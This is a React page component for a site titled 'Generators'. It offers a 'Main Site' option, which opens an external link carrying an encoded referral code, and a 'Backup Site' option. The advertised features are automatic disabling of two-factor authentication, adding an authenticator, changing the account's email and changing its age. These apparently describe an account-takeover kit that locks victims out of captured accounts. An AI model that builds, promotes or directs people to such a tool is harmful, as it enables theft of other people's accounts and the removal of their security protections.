import { Cloud, Star } from "lucide-react";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import Starfield from "@/components/Starfield";
import { playClickSound } from "@/components/AudioManager";

export default function Generator() {
  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      <Starfield />
      
      <div className="relative z-10 container mx-auto px-4 py-16">
        {/* Header */}
        <div className="text-center mb-16">
          <h1 className="text-7xl font-black mb-4 flex items-center justify-center gap-6 text-glow tracking-widest">
            <Cloud className="w-16 h-16 float-animation drop-shadow-[0_0_20px_rgba(255,255,255,0.6)]" />
            GENERATORS
            <Cloud className="w-16 h-16 float-animation drop-shadow-[0_0_20px_rgba(255,255,255,0.6)]" />
          </h1>
          <p className="text-gray-300 text-xl font-medium">Select your preferred generator option</p>
        </div>

        {/* Main Site Section */}
        <div className="max-w-4xl mx-auto mb-10">
          <div className="card-premium bg-black/40 backdrop-blur-xl rounded-2xl p-10 border-2 border-white/20">
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center gap-3">
                <div className="w-4 h-4 bg-white rounded-full scale-pulse shadow-lg shadow-white/50"></div>
                <h2 className="text-3xl font-bold">Main Site</h2>
              </div>
              <div className="flex gap-2">
                {[...Array(5)].map((_, i) => (
                  <Star key={i} className="w-7 h-7 fill-white text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.8)]" />
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 mb-8">
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Disable 2fac</span>
              </div>
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Change Age</span>
              </div>
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Add Authenticator</span>
              </div>
            </div>

            <Button
              className="w-full h-16 text-lg bg-white text-black hover:bg-gray-100 font-bold premium-button border-2 border-white shadow-xl shadow-white/40 rounded-xl"
              onClick={() => {
                playClickSound();
                window.open('https://immortal.rs/?code=NzA3Mzc1MjExMDU4MzA1NzIwOQ==', '_blank');
              }}
            >
              STANDARD OPTION
            </Button>
          </div>
        </div>

        {/* Backup Site Section */}
        <div className="max-w-4xl mx-auto mb-12">
          <div className="card-premium bg-black/40 backdrop-blur-xl rounded-2xl p-10 border-2 border-white/20">
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center gap-3">
                <div className="w-4 h-4 bg-white rounded-full scale-pulse shadow-lg shadow-white/50"></div>
                <h2 className="text-3xl font-bold">Backup Site</h2>
              </div>
              <div className="flex gap-2">
                {[...Array(5)].map((_, i) => (
                  <Star key={i} className="w-7 h-7 fill-white text-white drop-shadow-[0_0_8px_rgba(255,255,255,0.8)]" />
                ))}
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 mb-8">
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Set Email</span>
              </div>
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Disable 2Fac</span>
              </div>
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Add Authenticator</span>
              </div>
              <div className="flex items-center gap-2 text-sm font-medium">
                <div className="w-2 h-2 bg-white rounded-full shadow-sm shadow-white/50"></div>
                <span>Auto Change Age</span>
              </div>
            </div>

            <Link href="/backup">
              <Button className="w-full h-16 text-lg bg-white text-black hover:bg-gray-100 font-bold premium-button border-2 border-white shadow-xl shadow-white/40 rounded-xl" onClick={playClickSound}>
                STANDARD OPTION
              </Button>
            </Link>
          </div>
        </div>

        {/* Back Button */}
        <div className="text-center mt-12">
          <Link href="/">
            <button className="text-white hover:text-gray-200 text-lg transition-all font-bold hover:drop-shadow-[0_0_15px_rgba(255,255,255,0.6)]">
              ← Back to Home
            </button>
          </Link>
        </div>
      </div>
    </div>
  );
}
